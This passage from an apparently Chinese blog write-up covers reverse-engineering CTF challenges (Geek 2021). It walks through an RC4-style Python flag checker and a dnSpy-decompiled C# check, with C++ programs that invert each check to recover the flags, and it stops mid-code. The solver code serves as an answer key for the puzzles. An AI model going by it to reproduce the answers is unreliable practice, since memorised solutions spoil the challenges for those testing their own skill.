class="comment">#创造256的序列</span></span><br><span class="line">        k[m] = <span class="built_in">ord</span>(a[(m % <span class="number">8</span>)])  <span class="comment">#每8个一组Geek2021 一共32组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        t = (t + whatbox[i] + k[i]) % <span class="number">256</span></span><br><span class="line">        temp = whatbox[i]</span><br><span class="line">        whatbox[i] = whatbox[t]</span><br><span class="line">        whatbox[t] = temp</span><br><span class="line"><span class="comment">#[41, 244, 181, 212, 184, 237, 95, 117, 193, 26, 137, 126, 65, 122, 239, 250, 214, 112, 62, 207, 240, 227, 120, 48, 36, 148, 234, 150, 228, 165, 129, 174, 56, 190, 46, 127, 49, 43, 245, 130, 114, 34, 202, 27, 131, 224, 64, 160, 50, 153, 157, 206, 52, 91, 225, 58, 176, 14, 5, 147, 103, 12, 30, 146, 77, 61, 179, 85, 101, 71, 72, 210, 47, 253, 8, 98, 45, 7, 246, 67, 135, 18, 255, 168, 90, 139, 203, 2, 242, 32, 111, 22, 220, 102, 107, 138, 37, 169, 116, 28, 35, 156, 89, 173, 235, 185, 136, 31, 252, 29, 78, 63, 170, 25, 222, 19, 99, 44, 100, 124, 229, 144, 20, 221, 177, 232, 82, 163, 3, 249, 40, 93, 83, 68, 152, 223, 60, 54, 96, 97, 166, 94, 21, 16, 230, 154, 109, 178, 254, 92, 132, 155, 142, 1, 182, 243, 215, 197, 13, 0, 79, 151, 84, 187, 216, 180, 188, 175, 59, 66, 10, 106, 121, 183, 205, 42, 105, 204, 87, 86, 134, 189, 23, 241, 248, 118, 110, 211, 57, 158, 247, 231, 24, 218, 38, 149, 33, 15, 164, 217, 128, 115, 17, 233, 53, 236, 140, 51, 11, 208, 196, 55, 39, 172, 9, 76, 80, 226, 4, 70, 195, 108, 201, 69, 238, 123, 88, 145, 162, 125, 192, 219, 74, 161, 81, 198, 209, 73, 133, 186, 119, 251, 143, 200, 194, 171, 141, 104, 213, 113, 6, 159, 199, 167, 75, 191]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bbbbbbbbbb</span>(<span class="params">a</span>):</span></span><br><span class="line">    q = <span class="number">0</span></span><br><span class="line">    w = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>) :</span><br><span class="line">        q = (q + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        w = (w + whatbox[q]) % <span class="number">256</span></span><br><span class="line">        temp = whatbox[q]</span><br><span class="line">        whatbox[q] = whatbox[w]</span><br><span class="line">        whatbox[w] = temp</span><br><span class="line">        e = (whatbox[q] + whatbox[w]) % <span class="number">256</span></span><br><span class="line">        <span class="comment">#print(whatbox[e],end=&#x27;,&#x27;)</span></span><br><span class="line">        a[k] = a[k] ^ whatbox[e] ^ <span class="number">102</span></span><br><span class="line"><span class="comment">#[23,104,57,207,150,242,66,87,81,213,140,172,131,48,106,172,132,173,66,76,58,116,176,222,31,6,52,221,73,137,4,186]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ccccccccc</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>) :</span><br><span class="line">        a[i] ^= a[((i + <span class="number">1</span>) % <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">        a[j] ^= a[(j - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line">kkkkkkk = <span class="string">&#x27;Geek2021&#x27;</span></span><br><span class="line">tttttt = [<span class="number">117</span>, <span class="number">62</span>, <span class="number">240</span>, <span class="number">152</span>, <span class="number">195</span>, <span class="number">117</span>, <span class="number">103</span>, <span class="number">74</span>, <span class="number">240</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">162</span>, <span class="number">17</span>, <span class="number">75</span>, <span class="number">141</span>, <span class="number">165</span>, <span class="number">136</span>, <span class="number">117</span>, <span class="number">113</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">151</span>, <span class="number">174</span>, <span class="number">4</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">254</span>, <span class="number">101</span>, <span class="number">185</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">87</span>]</span><br><span class="line">ssss = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">inp = [<span class="number">0</span>] * <span class="built_in">len</span>(ssss)</span><br><span class="line"><span class="comment">#if len(ssss) != 32:</span></span><br><span class="line">    <span class="comment">#print(&#x27;Length Error!!!!&#x27;)</span></span><br><span class="line">    <span class="comment">#exit(0)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ssss)):</span><br><span class="line">    inp[i] = <span class="built_in">ord</span>(ssss[i])</span><br><span class="line"></span><br><span class="line"><span class="comment">#aaaaaaa(kkkkkkk)</span></span><br><span class="line"><span class="comment">#print(whatbox)</span></span><br><span class="line">bbbbbbbbbb(inp)</span><br><span class="line">ccccccccc(inp)</span><br><span class="line"><span class="comment">#for m in range(32):</span></span><br><span class="line">    <span class="comment">#assert not tttttt[m] != inp[m], &#x27;sorry your flag is wrong&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;success!!!!!!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;your flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ssss))</span><br></pre></td></tr></table></figure>



<p>我写的有点乱，毕竟我的 VSCode 调试不起只能这个样子来伪调试一下，我们简易的分析可以知道这个程序是在 Rc4 的基础上多了一部分的数组操作。我们根据对应操作进行逆向回去（ C + + 代码如下 ) ：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> t[]=&#123;<span class="number">23</span>,<span class="number">104</span>,<span class="number">57</span>,<span class="number">207</span>,<span class="number">150</span>,<span class="number">242</span>,<span class="number">66</span>,<span class="number">87</span>,<span class="number">81</span>,<span class="number">213</span>,<span class="number">140</span>,<span class="number">172</span>,<span class="number">131</span>,<span class="number">48</span>,<span class="number">106</span>,<span class="number">172</span>,<span class="number">132</span>,<span class="number">173</span>,<span class="number">66</span>,<span class="number">76</span>,<span class="number">58</span>,<span class="number">116</span>,<span class="number">176</span>,<span class="number">222</span>,<span class="number">31</span>,<span class="number">6</span>,<span class="number">52</span>,<span class="number">221</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">4</span>,<span class="number">186</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> ans[]=&#123;<span class="number">117</span>, <span class="number">62</span>, <span class="number">240</span>, <span class="number">152</span>, <span class="number">195</span>, <span class="number">117</span>, <span class="number">103</span>, <span class="number">74</span>, <span class="number">240</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">162</span>, <span class="number">17</span>, <span class="number">75</span>, <span class="number">141</span>, <span class="number">165</span>, <span class="number">136</span>, <span class="number">117</span>, <span class="number">113</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">151</span>, <span class="number">174</span>, <span class="number">4</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">254</span>, <span class="number">101</span>, <span class="number">185</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">87</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">31</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">		ans[i]^=ans[i<span class="number">-1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">31</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">		ans[j]^=ans[(j+<span class="number">1</span>)%<span class="number">32</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>;n&lt;<span class="number">32</span>;n++)&#123;</span><br><span class="line">		ans[n]=ans[n]^t[n]^<span class="number">102</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>;m&lt;<span class="number">32</span>;m++)&#123;</span><br><span class="line">		cout&lt;&lt;(<span class="keyword">char</span>)ans[m];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>运行代码之后我们便可以得到对应的 flag。</p>
<h3 id="new-language"><a href="#new-language" class="headerlink" title="new_language"></a><strong>new_language</strong></h3><p>我们根据提示拿到对应题目的信息可以知道这个是一个 C# 的反编译，我们安装对应程序 dnSpy 将程序拖入便可以得到对应的反编译代码，我们找到对应的主函数进行分析 ：</p>
<p><img src="https://static01.imgkr.com/temp/d8b0f96af38048208d051174d868c4d2.png"></p>
<p><img src="https://static01.imgkr.com/temp/2c7c79f7f69046a09e53f60b81c218f5.png"></p>
<p><img src="https://static01.imgkr.com/temp/3e7291ad8b594e00aa6658608bb876ec.png"></p>
<p>通过简单的分析，我们可以看到程序对输入的字符转换成 int 类型，并通过异或和与运算进行了乱序的排列并与 arry2 里面的数据进行比较，我们逆向回去的的话需要将原来的数据所在的位置找到，再对其进行分析代码如下 ：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num1[] = &#123; <span class="number">64</span>,<span class="number">249</span>,<span class="number">133</span>,<span class="number">69</span>,<span class="number">146</span>,<span class="number">253</span>,<span class="number">253</span>,<span class="number">207</span>,<span class="number">182</span>,<span class="number">4</span>,<span class="number">157</span>,<span class="number">207</span>,<span class="number">251</span>,<span class="number">4</span>,<span class="number">60</span>,<span class="number">81</span>,<span class="number">59</span>,<span class="number">77</span>,<span class="number">146</span>,<span class="number">77</span>,<span class="number">207</span>,<span class="number">26</span>,<span class="number">38</span>,<span class="number">207</span>,<span class="number">64</span>,<span class="number">77</span>,<span class="number">177</span>,<span class="number">77</span>,<span class="number">64</span>,<span class="number">195</span>,<span class="number">77</span>,<span class="number">253</span>,<span class="number">253</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> dir[]=&#123; </span><br><span class="line">			<span class="number">99</span>,</span><br><span class="line">			<span class="number">124</span>,</span><br><span class="line">			<span class="number">119</span>,</span><br><span class="line">			<span class="number">123</span>,</span><br><span class="line">			<span class="number">242</span>,</span><br><span class="line">			<span class="number">107</span>,</span><br><span class="line">			<span class="number">111</span>,</span><br><span class="line">			<span class="number">197</span>,</span><br><span class="line">			<span class="number">48</span>,</span><br><span class="line">			<span class="number">1</span>,</span><br><span class="line">			<span class="number">103</span>,</span><br><span class="line">			<span class="number">43</span>,</span><br><span class="line">			<span class="number">254</span>,</span><br><span class="line">			<span class="number">215</span>,</span><br><span class="line">			<span class="number">171</span>,</span><br><span class="line">			<span class="number">118</span>,</span><br><span class="line">			<span class="number">202</span>,</span><br><span class="line">			<span class="number">130</span>,</span><br><span class="line">			<span class="number">201</span>,</span><br><span class="line">			<span class="number">125</span>,</span><br><span class="line">			<span class="number">250</span>,</span><br><span class="line">			<span class="number">89</span>,</span><br><span class="line">			<span class="number">71</span>,</span><br><span class="line">			<span class="number">240</span>,</span><br><span class="line">			<span class="number">173</span>,</span><br><span class="line">			<span class="number">212</span>,</span><br><span class="line">			<span class="number">162</span>,</span><br><span class="line">			<span class="number">175</span>,</span><br><span class="line">			<span class="number">156</span>,</span><br><span class="line">			<span class="number">164</span>,</span><br><span class="line">			<span class="number">114</span>,</span><br><span class="line">			<span class="number">192</span>,</span><br><span class="line">			<span class="number">183</span>,</span><br><span class="line">			<span class="number">253</span>,</span><br><span class="line">			<span class="number">147</span>,</span><br><span class="line">			<span class="number">38</span>,</span><br><span class="line">			<span class="number">54</span>,</span><br><span class="line">			<span class="number">63</span>,</span><br><span class="line">			<span class="number">247</span>,</span><br><span class="line">			<span class="number">204</span>,</span><br><span class="line">			<span class="number">52</span>,</span><br><span class="line">			<span class="number">165</span>,</span><br><span class="line">			<span class="number">229</span>,</span><br><span class="line">			<span class="number">241</span>,</span><br><span class="line">			<span class="number">113</span>,</span><br><span class="line">			<span class="number">216</span>,</span><br><span class="line">			<span class="number">49</span>,</span><br><span class="line">			<span class="number">21</span>,</span><br><span class="line">			<span class="number">4</span>,</span><br><span class="line">			<span class="number">199</span>,</span><br><span class="line">			<span class="number">35</span>,</span><br><span class="line">			<span class="number">195</span>,</span><br><span class="line">			<span class="number">24</span>,</span><br><span class="line">			<span class="number">150</span>,</span><br><span class="line">			<span class="number">5</span>,</span><br><span class="line">			<span class="number">154</span>,</span><br><span class="line">			<span class="number">7</span>,</span><br><span class="line">			<span class="number">18</span>,</span><br><span class="line">			<span class="number">128</span>,</span><br><span class="line">			<span class="number">226</span>,</span><br><span class="line">			<span class="number">235</span>,</span><br><span class="line">			<span class="number">39</span>,</span><br><span class="line">			<span class="number">178</span>,</span><br><span class="line">			<span class="number">117</span>,</span><br><span class="line">			<span class="number">9</span>,</span><br><span class="line">			<span class="number">131</span>,</span><br><span class="line">			<span class="number">44</span>,</span><br><span class="line">			<span class="number">26</span>,</span><br><span class="line">			<span class="number">27</span>,</span><br><span class="line">			<span class="number">110</span>,</span><br><span class="line">			<span class="number">90</span>,</span><br><span class="line">			<span class="number">160</span>,</span><br><span class="line">			<span class="number">82</span>,</span><br><span class="line">			<span class="number">59</span>,</span><br><span class="line">			<span class="number">214</span>,</span><br><span class="line">			<span class="number">179</span>,</span><br><span class="line">			<span class="number">41</span>,</span><br><span class="line">			<span class="number">227</span>,</span><br><span class="line">			<span class="number">47</span>,</span><br><span class="line">			<span class="number">132</span>,</span><br><span class="line">			<span class="number">83</span>,</span><br><span class="line">			<span class="number">209</span>,</span><br><span class="line">			<span class="number">0</span>,</span><br><span class="line">			<span class="number">237</span>,</span><br><span class="line">			<span class="number">32</span>,</span><br><span class="line">			<span class="number">252</span>,</span><br><span class="line">			<span class="number">177</span>,</span><br><span class="line">			<span class="number">91</span>,</span><br><span class="line">			<span class="number">106</span>,</span><br><span class="line">			<span class="number">203</span>,</span><br><span class="line">			<span class="number">190</span>,</span><br><span class="line">			<span class="number">57</span>,</span><br><span class="line">			<span class="number">74</span>,</span><br><span class="line">			<span class="number">76</span>,</span><br><span class="line">			<span class="number">88</span>,</span><br><span class="line">			<span class="number">207</span>,</span><br><span class="line">			<span class="number">208</span>,</span><br><span class="line">			<span class="number">239</span>,</span><br><span class="line">			<span class="number">170</span>,</span><br><span class="line">			<span class="number">251</span>,</span><br><span class="line">			<span class="number">67</span>,</span><br><span class="line">			<span class="number">77</span>,</span><br><span class="line">			<span class="number">51</span>,</span><br><span class="line">			<span class="number">133</span>,</span><br><span class="line">			<span class="number">69</span>,</span><br><span class="line">			<span class="number">249</span>,</span><br><span class="line">			<span class="number">2</span>,</span><br><span class="line">			<span class="number">127</span>,</span><br><span class="line">			<span class="number">80</span>,</span><br><span class="line">			<span class="number">60</span>,</span><br><span class="line">			<span class="number">159</span>,</span><br><span class="line">			<span class="number">168</span>,</span><br><span class="line">			<span class="number">81</span>,</span><br><span class="line">			<span class="number">163</span>,</span><br><span class="line">			<span class="number">64</span>,</span><br><span class="line">			<span class="number">143</span>,</span><br><span class="line">			<span class="number">146</span>,</span><br><span class="line">			<span class="number">157</span>,</span><br><span class="line">			<span class="number">56</span>,</span><br><span class="line">			<span class="number">245</span>,</span><br><span class="line">			<span class="number">188</span>,</span><br><span class="line">			<span class="number">182</span>,</span><br><span class="line">			<span class="number">218</span>,</span><br><span class="line">			<span class="number">33</span>,</span><br><span class="line">			<span class="number">16</span>,</span><br><span class="line">			<span class="number">255</span>,</span><br><span class="line">			<span class="number">243</span>,</span><br><span class="line">			<span class="number">210</span>,</span><br><span class="line">			<span class="number">205</span>,</span><br><span class="line">			<span class="number">12</span>,</span><br><span class="line">			<span class="number">19</span>,</span><br><span class="line">			<span class="number">236</span>,</span><br><span class="line">			<span class="number">95</span>,</span><br><span class="line">			<span class="number">151</span>,</span><br><span class="line">			<span class="number">68</span>,</span><br><span class="line">			<span class="number">23</span>,</span><br><span class="line">			<span class="number">196</span>,</span><br><span class="line">			<span class="number">167</span>,</span><br><span class="line">			<span class="number">126</span>,</span><br><span class="line">			<span class="number">61</span>,</span><br><span class="line">			<span class="number">100</span>,</span><br><span class="line">			<span class="number">93</span>,</span><br><span class="line">			<span class="number">25</span>,</span><br><span class="line">			<span class="number">115</span>,</span><br><span class="line">			<span class="number">96</span>,</span><br><span class="line">			<span class="number">129</span>,</span><br><span class="line">			<span class="number">79</span>,</span><br><span class="line">			<span class="number">220</span>,</span><br><span class="line">			<span class="number">34</span>,</span><br><span class="line">			<span class="number">42</span>,</span><br><span class="line">			<span class="number">144</span>,</span><br><span class="line">			<span class="number">136</span>,</span><br><span class="line">			<span class="number">70</span>,</span><br><span class="line">			<span class="number">238</span>,</span><br><span class="line">			<span class="number">184</span>,</span><br><span class="line">			<span class="number">20</span>,</span><br><span class="line">			<span class="number">222</span>,</span><br><span class="line">			<span class="number">94</span>,</span><br><span class="line">			<span class="number">11</span>,</span><br><span class="line">			<span class="number">219</span>,</span><br><span class="line">			<span class="number">224</span>,</span><br><span class="line">			<span class="number">50</span>,</span><br><span class="line">			<span class="number">58</span>,</span><br><span class="line">			<span class="number">10</span>,</span><br><span class="line">			<span class="number">73</span>,</span><br><span class="line">			<span class="number">6</span>,</span><br><span class="line">			<span class="number">36</span>,</span><br><span class="line">			<span class="number">92</span>,</span><br><span class="line">			<span class="number">194</span>,</span><br><span class="line">			<span class="number">211</span>,</span><br><span class="line">			<span class="number">172</span>,</span><br><span class="line">			<span class="number">98</span>,</span><br><span class="line">			<span class="number">145</span>,</span><br><span class="line">			<span class="number">149</span>,</span><br><span class="line">			<span class="number">228</span>,</span><br><span class="line">			<span class="number">121</span>,</span><br><span class="line">			<span class="number">231</span>,</span><br><span class="line">			<span class="number">200</span>,</span><br><span class="line">			<span class="number">55</span>,</span><br><span class="line">			<span class="number">109</span>,</span><br><span class="line">			<span class="number">141</span>,</span><br><span class="line">			<span class="number">213</span>,</span><br><span class="line">			<span class="number">78</span>,</span><br><span class="line">			<span class="number">169</span>,</span><br><span class="line">			<span class="number">108</span>,</span><br><span class="line">			<span class="number">86</span>,</span><br><span class="line">			<span class="number">244</span>,</span><br><span class="line">			<span class="number">234</span>,</span><br><span class="line">			<span class="number">101</span>,</span><br><span class="line">			<span class="number">122</span>,</span><br><span class="line">			<span class="number">174</span>,</span><br><span class="line">			<span class="number">8</span>,</span><br><span class="line">			<span class="number">186</span>,</span><br><span class="line">			<span class="number">120</span>,</span><br><span class="line">			<span class="number">37</span>,</span><br><span class="line">			<span class="number">46</span>,</span><br><span class="line">			<span class="number">28</span>,</span><br><span class="line">			<span class="number">166</span>,</span><br><span class="line">			<span class="number">180</span>,</span><br><span class="line">			<span class="number">198</span>,</span><br><span class="line">			<span class="number">232</span>,</span><br><span class="line">			<span class="number">221</span>,</span><br><span class="line">			<span class="number">116</span>,</span><br><span class="line">			<span class="number">31</span>,</span><br><span class="line">			<span class="number">75</span>,</span><br><span class="line">			<span class="number">189</span>,</span><br><span class="line">			<span class="number">139</span>,</span><br><span class="line">			<span class="number">138</span>,</span><br><span class="line">			<span class="number">112</span>,</span><br><span class="line">			<span class="number">62</span>,</span><br><span class="line">			<span class="number">181</span>,</span><br><span class="line">			<span class="number">102</span>,</span><br><span class="line">			<span class="number">72</span>,</span><br><span class="line">			<span class="number">3</span>,</span><br><span class="line">			<span class="number">246</span>,</span><br><span class="line">			<span class="number">14</span>,</span><br><span class="line">			<span class="number">97</span>,</span><br><span class="line">			<span class="number">53</span>,</span><br><span class="line">			<span class="number">87</span>,</span><br><span class="line">			<span class="number">185</span>,</span><br><span class="line">			<span class="number">134</span>,</span><br><span class="line">			<span class="number">193</span>,</span><br><span class="line">			<span class="number">29</span>,</span><br><span class="line">			<span class="number">158</span>,</span><br><span class="line">			<span class="number">225</span>,</span><br><span class="line">			<span class="number">248</span>,</span><br><span class="line">			<span class="number">152</span>,</span><br><span class="line">			<span class="number">17</span>,</span><br><span class="line">			<span class="number">105</span>,</span><br><span class="line">			<span class="number">217</span>,</span><br><span class="line">			<span class="number">142</span>,</span><br><span class="line">			<span class="number">148</span>,</span><br><span class="line">			<span class="number">155</span>,</span><br><span class="line">			<span class="number">30</span>,</span><br><span class="line">			<span class="number">135</span>,</span><br><span class="line">			<span class="number">233</span>,</span><br><span class="line">			<span class="number">206</span>,</span><br><span class="line">			<span class="number">85</span>,</span><br><span class="line">			<span class="number">40</span>,</span><br><span class="line">			<span class="number">223</span>,</span><br><span class="line">			<span class="number">140</span>,</span><br><span class="line">			<span class="number">161</span>,</span><br><span class="line">			<span class="number">137</span>,</span><br><span class="line">			<span class="number">13</span>,</span><br><span class="line">			<span class="number">191</span>,</span><br><span class="line">			<span class="number">230</span>,</span><br><span class="line">			<span class="number">66</span>,</span><br><span class="line">			<span class="number">104</span>,</span><br><span class="line">			<span class="number">65</span>,</span><br><span class="line">			<span class="number">153</span>,</span><br><span class="line">			<span class="number">45</span>,</span><br><span class="line">			<span class="number">15</span>,</span><br><span class="line">			<span class="number">176</span>,</span><br><span class="line">			<span class="number">84</span>,</span><br><span class="line">			<span class="number">187</span>,</span><br><span class="line">			<span class="number">22</span></span><br><span class="line">		&#125;; <span class="comment">//太长了不想去删空格</span></span><br><span class="line">		<span class="keyword">int</span> des[<span class="number">33</span>];</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> 